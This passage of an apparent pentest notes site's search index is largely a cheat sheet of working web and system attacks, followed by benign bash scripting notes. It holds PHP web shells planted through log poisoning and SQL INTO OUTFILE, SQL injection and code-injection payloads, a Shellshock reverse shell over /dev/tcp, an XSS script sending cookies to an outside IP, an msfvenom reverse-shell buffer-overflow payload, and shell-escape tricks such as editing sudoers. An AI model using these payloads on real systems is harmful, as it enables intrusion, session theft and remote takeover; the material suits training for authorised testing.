80 ( http ) open <?php echo '<pre>' . shell_exec ( $_GET [ 'cmd' ]) . '</pre>' ; ?> Get RCE via file inclusion curl http://192.168.11.131/file.php?file = c: \\x ampp \\a pache \\l ogs \\a ccess.log & cmd = ipconfig Remote File Inclusion <?php echo shell_exec ( $_GET [ 'cmd' ]); ?> curl http://target/?page = http:// $ip /backdoor.txt & cmd = id SQL Injection Authentication Bypass admin ' or 1 = 1 LIMIT 1 ; # Enumerating the Database order by 3 union all select 1 , 2 , 3 union all select 1 , @@version, 3 union all select 1 , table_name from information_schema.tables, 3 union all select 1 , column_name from information_schema.columns where table_name = 'users' , 3 union all select 1 , username, password from users SQLi to Code Execution Read file union all select 1 , load_file ( 'C:/Windows/System32/drivers/etc/hosts' ) , 3 Write backdoor union all select 1 , \"<?php echo shell_exec( $_GET ['cmd']);?>\" into OUTFILE 'c:/xampp/htdocs/backdoor.php' , 3 Automating SQL Injection sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" dump databases sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --dump execute a shell sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --os-shell Shellshock POC curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ $myip /445 0>&1'\" http:// $ip /cgi-bin/user.sh Command Execution ; id ` id ` $( id ) Code Execution Ruby eval \"\\\"\" +params [ '1' ] + \"\\\"\" ?1 = \"%2b`id`%2b\" Python eval ( '\"' +1+ '\"' ) \"%2bos.system('id')%2b\" \"%2bos.popen('id').read()%2b\" \"%2b__import__('os').popen('id').read()%2b\" \"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b\" Perl eval ( \"return '\" . $FORM { 1 } . \"'\" ) ; /cgi-bin/form?1 = '.`id`.' PHP eval() $s = \"echo \\\"\" . $_GET [ '1' ] . \"\\\";\" ; eval ( $s ) ; ?1 = \".system('id').\" usort() $1 = $_GET [ \"1\" ] ; usort ( function ( '$a, $b' , 'return strcmp($a->' . $1 . ',$b->' . $1 . ');' )) ; ?1 = id ) ; } system ( 'id' ) ; // preg_replace() preg_replace ( $_GET [ \"1\" ] , $_GET [ \"2\" ] , $_GET [ \"3\" ]) ; ?1 = /x/e & 2 = system ( 'id' ) & 3 = x assert() assert ( trim ( \"'\" . $_GET [ '1' ] . \"'\" )) ; echo htmlentities ( $_GET [ '1' ]) ; ?1 = hacker '.system(' id ').' XSS Basic Exploit Break code < > ' \" { } ; Content Injection <iframe src=http://ip/report height=\"0\" width=\"0\"></iframe> Stealing Cookies and Session Information <script>new Image().src=\"http://10.11.0.4/cool.jpg?output=\"+document.cookie;</script>","title":"Exploitation"},{"location":"penetration-testing/web-application/exploitation.html#exploitation","text":"","title":"Exploitation"},{"location":"penetration-testing/web-application/exploitation.html#credentials","text":"Create Passwd Directory for Brute Force cewl -m 5 http:// $ip /joomla/ > passwd.txt Default Credentials ls /usr/share/seclists/Passwords/Default-Credentials Crack hash john hash --wordlist = /home/kali/tools/directory/rockyou.txt Broute force hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192 .168.169.106 --http-post-form '/login:user=^USER^,pass=^PASS^:Unauthorized'","title":"Credentials"},{"location":"penetration-testing/web-application/exploitation.html#directory-traversal","text":"Unix /etc/passwd Windows c:\\windows\\system32\\drivers\\etc\\hosts","title":"Directory Traversal"},{"location":"penetration-testing/web-application/exploitation.html#php-wrappers","text":"Inject php code via plantext http://ip/file.php?file = data:text/plain,<?php echo shell_exec ( \"dir\" ) ?> Inject php code via base64 http://ip/file.php?file = data: ; base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4 = & x = dir Encode base64 file before read it. http://ip/file.php?file = php://filter/read = convert.base64-encode/resource = /etc/passwd","title":"PHP Wrappers"},{"location":"penetration-testing/web-application/exploitation.html#file-inclusion","text":"","title":"File Inclusion"},{"location":"penetration-testing/web-application/exploitation.html#local-file-inclusion","text":"Null byte: %00 Write payload to access.log file $ nc -nv 192 .168.11.131 80 ( UNKNOWN ) [ 192 .168.11.131 ] 80 ( http ) open <?php echo '<pre>' . shell_exec ( $_GET [ 'cmd' ]) . '</pre>' ; ?> Get RCE via file inclusion curl http://192.168.11.131/file.php?file = c: \\x ampp \\a pache \\l ogs \\a ccess.log & cmd = ipconfig","title":"Local File Inclusion"},{"location":"penetration-testing/web-application/exploitation.html#remote-file-inclusion","text":"<?php echo shell_exec ( $_GET [ 'cmd' ]); ?> curl http://target/?page = http:// $ip /backdoor.txt & cmd = id","title":"Remote File Inclusion"},{"location":"penetration-testing/web-application/exploitation.html#sql-injection","text":"","title":"SQL Injection"},{"location":"penetration-testing/web-application/exploitation.html#authentication-bypass","text":"admin ' or 1 = 1 LIMIT 1 ; #","title":"Authentication Bypass"},{"location":"penetration-testing/web-application/exploitation.html#enumerating-the-database","text":"order by 3 union all select 1 , 2 , 3 union all select 1 , @@version, 3 union all select 1 , table_name from information_schema.tables, 3 union all select 1 , column_name from information_schema.columns where table_name = 'users' , 3 union all select 1 , username, password from users","title":"Enumerating the Database"},{"location":"penetration-testing/web-application/exploitation.html#sqli-to-code-execution","text":"Read file union all select 1 , load_file ( 'C:/Windows/System32/drivers/etc/hosts' ) , 3 Write backdoor union all select 1 , \"<?php echo shell_exec( $_GET ['cmd']);?>\" into OUTFILE 'c:/xampp/htdocs/backdoor.php' , 3","title":"SQLi to Code Execution"},{"location":"penetration-testing/web-application/exploitation.html#automating-sql-injection","text":"sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" dump databases sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --dump execute a shell sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --os-shell","title":"Automating SQL Injection"},{"location":"penetration-testing/web-application/exploitation.html#shellshock-poc","text":"curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ $myip /445 0>&1'\" http:// $ip /cgi-bin/user.sh","title":"Shellshock POC"},{"location":"penetration-testing/web-application/exploitation.html#command-execution","text":"; id ` id ` $( id )","title":"Command Execution"},{"location":"penetration-testing/web-application/exploitation.html#code-execution","text":"Ruby eval \"\\\"\" +params [ '1' ] + \"\\\"\" ?1 = \"%2b`id`%2b\" Python eval ( '\"' +1+ '\"' ) \"%2bos.system('id')%2b\" \"%2bos.popen('id').read()%2b\" \"%2b__import__('os').popen('id').read()%2b\" \"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b\" Perl eval ( \"return '\" . $FORM { 1 } . \"'\" ) ; /cgi-bin/form?1 = '.`id`.' PHP eval() $s = \"echo \\\"\" . $_GET [ '1' ] . \"\\\";\" ; eval ( $s ) ; ?1 = \".system('id').\" usort() $1 = $_GET [ \"1\" ] ; usort ( function ( '$a, $b' , 'return strcmp($a->' . $1 . ',$b->' . $1 . ');' )) ; ?1 = id ) ; } system ( 'id' ) ; // preg_replace() preg_replace ( $_GET [ \"1\" ] , $_GET [ \"2\" ] , $_GET [ \"3\" ]) ; ?1 = /x/e & 2 = system ( 'id' ) & 3 = x assert() assert ( trim ( \"'\" . $_GET [ '1' ] . \"'\" )) ; echo htmlentities ( $_GET [ '1' ]) ; ?1 = hacker '.system(' id ').'","title":"Code Execution"},{"location":"penetration-testing/web-application/exploitation.html#xss-basic-exploit","text":"Break code < > ' \" { } ; Content Injection <iframe src=http://ip/report height=\"0\" width=\"0\"></iframe> Stealing Cookies and Session Information <script>new Image().src=\"http://10.11.0.4/cool.jpg?output=\"+document.cookie;</script>","title":"XSS Basic Exploit"},{"location":"penetration-testing/wireless-rfid/index.html","text":"","title":"Wireless & RFID"},{"location":"red-teaming/index.html","text":"__ LeeCyberSec __ About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__index__"},{"location":"red-teaming/index.html#__leecybersec__","text":"About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__LeeCyberSec__"},{"location":"red-teaming/antivirus-evasion/index.html","text":"Antivirus Evasion","title":"Antivirus Evasion"},{"location":"red-teaming/antivirus-evasion/index.html#antivirus-evasion","text":"","title":"Antivirus Evasion"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html","text":"Buffer Overflow Buffer Overflow tutorial step by step with Immunity Debugger OSCP Buffer Overflow Cheat Sheet Offset Create pattern for juck value msf-pattern_create -l <byte> Identify the offset msf-pattern_offset -q <EIP value> Badchars \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" JMP ESP Import mona in Immunity Debugger !mona modules !mona find -s \"\\xff\\xe4\" -m \"app.dll\" Exploit Payload msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\"","title":"Buffer Overflow"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html#buffer-overflow","text":"Buffer Overflow tutorial step by step with Immunity Debugger OSCP Buffer Overflow Cheat Sheet","title":"Buffer Overflow"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html#offset","text":"Create pattern for juck value msf-pattern_create -l <byte> Identify the offset msf-pattern_offset -q <EIP value>","title":"Offset"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html#badchars","text":"\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"","title":"Badchars"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html#jmp-esp","text":"Import mona in Immunity Debugger !mona modules !mona find -s \"\\xff\\xe4\" -m \"app.dll\"","title":"JMP ESP"},{"location":"red-teaming/exploit-dev/buffer-overflow/index.html#exploit-payload","text":"msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\"","title":"Exploit Payload"},{"location":"red-teaming/exploit-dev/metasploit-framework/index.html","text":"","title":"Metasploit Framework"},{"location":"red-teaming/exploit-dev/nse-script/index.html","text":"","title":"Nmap Scripting Engine"},{"location":"red-teaming/malware-development/index.html","text":"Malware development https://0xpat.github.io/Malware_development_part_1 https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86","title":"Malware development"},{"location":"red-teaming/malware-development/index.html#malware-development","text":"https://0xpat.github.io/Malware_development_part_1 https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86","title":"Malware development"},{"location":"red-teaming/powershell-empire/index.html","text":"","title":"Powershell Empire"},{"location":"red-teaming/unix-system/commands.html","text":"Commands GTFOBins Linux PriEscal Manual page man Spawn shell In Manual page, we can execute !/bin/bash to spawn a shell. man <key search> man -k '^passwd$' Terminal editor vi vi -c ':!/bin/sh' /dev/null vi :set shell = /bin/sh :shell nano nano ^R^X reset ; sh 1 > & 0 2 > & 0 sudo nano /var/opt/../../etc/sudoers Finding finding files find / -name \"<name>\" history, bashrc, backup find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null Binaries That AutoElevate find / -perm -u = s -type f 2 >/dev/null Spawn shell find . -exec /bin/sh \\; Downloading wget wget -O /tmp/shell http://192.168.110.131/shell.elf wget <uri> -P /path/to/ curl curl -o /tmp/shell http://192.168.110.131/shell.elf axel axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf Filter output sed sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' cut echo \"hacking, penetration testing and bug hunting\" | cut -f 2 -d \" \" cut -d \":\" -f 1 /etc/passwd awk cat /etc/passwd | awk -F \":\" '{print $1, \":\", $7}' | grep \"sh\" uniq -c cat list.txt | sort | uniq -c | sort -r grep ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' grep -v \"Nmap\" Monitoring tail sudo tail -f /var/log/apache2/access.log watch watch -n 1 date Screenshot cutycapt cutycapt --url = $ip --out = $ip .png Redirect to a New File ls > list.txt cat list.txt Desktop Documents list.txt to an Existing File echo \"Add new\" >> list.txt from a File wc -m < list.txt STDERR find / -perm -u = s -type f 2 >/dev/null Processes Background a process nmap -p- 127 .0.0.1 & Suspend the job \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ nmap -p- 192 .168.11.131 -Pn Host discovery disabled ( -Pn ) . All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7 .91 ( https://nmap.org ) at 2021 -03-09 20 :52 EST ^Z zsh: suspended nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.4 ] ~ \u2514\u2500$ bg [ 1 ] + continued nmap -p- 192 .168.11.131 -Pn jobs and fg \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ jobs [ 1 ] + running nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .8:11.4 ] ~ \u2514\u2500$ fg [ 1 ] + running nmap -p- 192 .168.11.131 -Pn ^C ps and kill ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 20 :39 ? 00 :00:02 /sbin/init splash <snip> kali 1448 1202 0 20 :56 pts/0 00 :00:01 nmap -p- 192 .168.11.131 -Pn kali 1466 1202 0 20 :56 pts/0 00 :00:00 nmap -p- 192 .168.11.132 -Pn kali 1484 1202 0 20 :57 pts/0 00 :00:00 nmap -p- 192 .168.11.133 -Pn kali 1673 1202 0 20 :59 pts/0 00 :00:00 ps -ef ps -fC nmap UID PID PPID C STIME TTY TIME CMD kali 1448 1202 0 20 :56 pts/0 00 :00:01 nmap -p- 192 .168.11.131 -Pn kali 1466 1202 0 20 :56 pts/0 00 :00:00 nmap -p- 192 .168.11.132 -Pn kali 1484 1202 0 20 :57 pts/0 00 :00:00 nmap -p- 192 .168.11.133 -Pn kill 1466 2 \u2699 [ 2 ] + terminated nmap -p- 192 .168.11.132 -Pn","title":"Commands"},{"location":"red-teaming/unix-system/commands.html#commands","text":"","title":"Commands"},{"location":"red-teaming/unix-system/commands.html#gtfobins","text":"","title":"GTFOBins"},{"location":"red-teaming/unix-system/commands.html#linux-priescal","text":"","title":"Linux PriEscal"},{"location":"red-teaming/unix-system/commands.html#manual-page","text":"man Spawn shell In Manual page, we can execute !/bin/bash to spawn a shell. man <key search> man -k '^passwd$'","title":"Manual page"},{"location":"red-teaming/unix-system/commands.html#terminal-editor","text":"vi vi -c ':!/bin/sh' /dev/null vi :set shell = /bin/sh :shell nano nano ^R^X reset ; sh 1 > & 0 2 > & 0 sudo nano /var/opt/../../etc/sudoers","title":"Terminal editor"},{"location":"red-teaming/unix-system/commands.html#finding","text":"finding files find / -name \"<name>\" history, bashrc, backup find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null Binaries That AutoElevate find / -perm -u = s -type f 2 >/dev/null Spawn shell find . -exec /bin/sh \\;","title":"Finding"},{"location":"red-teaming/unix-system/commands.html#downloading","text":"wget wget -O /tmp/shell http://192.168.110.131/shell.elf wget <uri> -P /path/to/ curl curl -o /tmp/shell http://192.168.110.131/shell.elf axel axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf","title":"Downloading"},{"location":"red-teaming/unix-system/commands.html#filter-output","text":"sed sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' cut echo \"hacking, penetration testing and bug hunting\" | cut -f 2 -d \" \" cut -d \":\" -f 1 /etc/passwd awk cat /etc/passwd | awk -F \":\" '{print $1, \":\", $7}' | grep \"sh\" uniq -c cat list.txt | sort | uniq -c | sort -r grep ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' grep -v \"Nmap\"","title":"Filter output"},{"location":"red-teaming/unix-system/commands.html#monitoring","text":"tail sudo tail -f /var/log/apache2/access.log watch watch -n 1 date","title":"Monitoring"},{"location":"red-teaming/unix-system/commands.html#screenshot","text":"cutycapt cutycapt --url = $ip --out = $ip .png","title":"Screenshot"},{"location":"red-teaming/unix-system/commands.html#redirect","text":"to a New File ls > list.txt cat list.txt Desktop Documents list.txt to an Existing File echo \"Add new\" >> list.txt from a File wc -m < list.txt STDERR find / -perm -u = s -type f 2 >/dev/null","title":"Redirect"},{"location":"red-teaming/unix-system/commands.html#processes","text":"Background a process nmap -p- 127 .0.0.1 & Suspend the job \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ nmap -p- 192 .168.11.131 -Pn Host discovery disabled ( -Pn ) . All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7 .91 ( https://nmap.org ) at 2021 -03-09 20 :52 EST ^Z zsh: suspended nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.4 ] ~ \u2514\u2500$ bg [ 1 ] + continued nmap -p- 192 .168.11.131 -Pn jobs and fg \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ jobs [ 1 ] + running nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .8:11.4 ] ~ \u2514\u2500$ fg [ 1 ] + running nmap -p- 192 .168.11.131 -Pn ^C ps and kill ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 20 :39 ? 00 :00:02 /sbin/init splash <snip> kali 1448 1202 0 20 :56 pts/0 00 :00:01 nmap -p- 192 .168.11.131 -Pn kali 1466 1202 0 20 :56 pts/0 00 :00:00 nmap -p- 192 .168.11.132 -Pn kali 1484 1202 0 20 :57 pts/0 00 :00:00 nmap -p- 192 .168.11.133 -Pn kali 1673 1202 0 20 :59 pts/0 00 :00:00 ps -ef ps -fC nmap UID PID PPID C STIME TTY TIME CMD kali 1448 1202 0 20 :56 pts/0 00 :00:01 nmap -p- 192 .168.11.131 -Pn kali 1466 1202 0 20 :56 pts/0 00 :00:00 nmap -p- 192 .168.11.132 -Pn kali 1484 1202 0 20 :57 pts/0 00 :00:00 nmap -p- 192 .168.11.133 -Pn kill 1466 2 \u2699 [ 2 ] + terminated nmap -p- 192 .168.11.132 -Pn","title":"Processes"},{"location":"red-teaming/unix-system/filesystem.html","text":"Unix Filesystem Wiki Unix filesystem /bin - basic programs (ls, cd, cat, etc.) /sbin - system programs (fdisk, mkfs, sysctl, etc) /etc - configuration files /tmp - temporary files (typically deleted on boot) /usr/bin - applications (apt, ncat, nmap, etc.) /usr/share - application support and data files","title":"Filesystem"},{"location":"red-teaming/unix-system/filesystem.html#unix-filesystem","text":"","title":"Unix Filesystem"},{"location":"red-teaming/unix-system/filesystem.html#wiki-unix-filesystem","text":"/bin - basic programs (ls, cd, cat, etc.) /sbin - system programs (fdisk, mkfs, sysctl, etc) /etc - configuration files /tmp - temporary files (typically deleted on boot) /usr/bin - applications (apt, ncat, nmap, etc.) /usr/share - application support and data files","title":"Wiki Unix filesystem"},{"location":"red-teaming/unix-system/scripting.html","text":"Bash Scripting https://devhints.io/bash https://github.com/leecybersec/scripting Hello World Running chmod +x hello_world.sh ./hello_world.sh hello_world.sh #!/bin/bash echo \"Hello World!\" My Self Script Running chmod +x my_self.sh ./my_self.sh my_self.sh #!/bin/bash ip = \" $( ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' ) \" name = ` whoami ` echo \"I'm $name \" echo \"My IP is $ip \" echo \"Command: ping -c 2 $ip \" ping -c 2 $ip Arguments and If Else Arguments $0 The name of the Bash script $1 -$9 The first 9 arguments to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the most recently run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script If Else Elif !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 != STRING2 STRING1 is not equal to STRING2 STRING1 = STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission Nmap All Ports Scan Script Running chmod +x nmap_all_ports.sh ./nmap_all_ports.sh 127 .0.0.1 nmap_all_ports.sh #!/bin/bash if [ $# -eq 0 ] || [ $1 = \"-h\" ] || [ $1 = \"--help\" ] then echo \"Usage: $0 <HOST>\" exit else ports = $( nmap -p- --min-rate 1000 $1 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) if [ -z $ports ] then echo \"No open port!\" exit else echo \"Opening port: $ports \" nmap -sC -sV -p $ports $1 fi fi Loops and Functions Loops for var-name in <list> do <action to perform> done while [ <some test> ] do <perform an action> done Functions function function_name { commands... } function_name () { commands... } Auto Enum Script Running chmod +x auto_enum.sh ./auto_enum.sh 127 .0.0.1 auto_enum.sh #!/bin/bash RED = '\\033[0;31m' YELLOW = '\\033[0;33m' GREEN = '\\033[0;32m' NC = '\\033[0m' origIFS = \" ${ IFS } \" if [ -z $1 ] ; then echo \"Usage: $0 <HOST>\" exit else host = $1 ports = $2 service = $3 fi enum_all_port () { printf \"\\n ${ YELLOW } Scanning openning port ...\\n ${ NC } \" if [ -z $ports ] ; then ports = $( nmap -sS -p- --min-rate 1000 $host | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) fi if [ -z $ports ] ; then printf \" ${ RED } [-] Found no openning port! ${ NC } \" exit else printf \" ${ GREEN } [+] Openning ports: $ports \\n ${ NC } \" array_ports = $( echo $ports | tr ',' '\\n' ) fi } enum_open_service () { printf \"\\n ${ YELLOW } ===============================services===============================\\n ${ NC } \" echo \"nmap -sC -sV -Pn $1 -p $2 \" nmap -sC -sV $host -p $ports } enum_smtp_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"nmap $host -p $port -Pn --script=smtp-*\" nmap $host -p $port --script = smtp-* } enum_web_service () { printf \"\\n ${ YELLOW } =============================== $url ===============================\\n ${ NC } \" printf \"\\n ${ GREEN } [+] Files and directories\\n ${ NC } \" echo \"gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt\" gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt printf \"\\n ${ GREEN } [+] All URLs\\n ${ NC } \" curl -k $url : $port -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' } enum_smb_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"smbmap -H $host \" smbmap -H $host echo \"smbclient -L $host \" smbclient -NL $host } recon () { if [ -z $service ] ; then for port in $array_ports ; do if [ $port = \"25\" ] ; then enum_smtp_service $host $port elif [ $port = \"80\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $port = \"443\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $port = \"445\" ] ; then enum_smb_service $host $port fi done else port = $ports if [ $service = \"smtp\" ] ; then enum_smtp_service $host $port elif [ $service = \"http\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $service = \"https\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $service = \"smb\" ] ; then enum_smb_service $host $port fi fi } main () { enum_all_port $host $ports enum_open_service $host $ports recon $array_ports $service } main","title":"Scripting"},{"location":"red-teaming/unix-system/scripting.html#bash-scripting","text":"https://devhints.io/bash https://github.com/leecybersec/scripting","title":"Bash Scripting"},{"location":"red-teaming/unix-system/scripting.html#hello-world","text":"Running chmod +x hello_world.sh ./hello_world.sh hello_world.sh #!/bin/bash echo \"Hello World!\"","title":"Hello World"},{"location":"red-teaming/unix-system/scripting.html#my-self-script","text":"Running chmod +x my_self.sh ./my_self.sh my_self.sh #!/bin/bash ip = \" $( ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' ) \" name = ` whoami ` echo \"I'm $name \" echo \"My IP is $ip \" echo \"Command: ping -c 2 $ip \" ping -c 2 $ip","title":"My Self Script"},{"location":"red-teaming/unix-system/scripting.html#arguments-and-if-else","text":"Arguments $0 The name of the Bash script $1 -$9 The first 9 arguments to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the most recently run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script If Else Elif !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 != STRING2 STRING1 is not equal to STRING2 STRING1 = STRING2 